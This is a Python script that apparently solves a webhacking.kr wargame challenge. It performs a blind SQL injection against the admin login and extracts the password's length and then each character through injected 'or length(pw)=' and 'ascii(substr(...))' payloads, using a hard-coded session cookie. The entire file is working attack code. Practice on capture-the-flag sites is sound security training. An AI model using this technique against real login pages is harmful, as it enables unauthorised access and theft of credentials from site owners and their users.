import requests

cookies={'PHPSESSID':'1uv1k3nmdjkp58kt643v5al23t'}
url = "https://webhacking.kr/challenge/bonus-1/index.php"

pw_length = 0
pw = []

for i in range(40):
    query = f"?id=admin&pw=' or length(pw)={i}%23"
    res = requests.get(url+query, cookies=cookies)
    if res.text.find('wrong password') > 0:
        pw_length = i
print(pw_length)

pw = ''
for i in range(1, pw_length+1):
    for j in range(33, 123): # ! ~ z
        query = f"?id=admin&pw=' or ascii(substr(pw,{i},1))={j}%23"
        res = requests.get(url+query, cookies=cookies)
        if res.text.find('wrong password') > 0:
            pw += chr(j)
            print(pw)
            break
print(f'cracked pw: {pw}')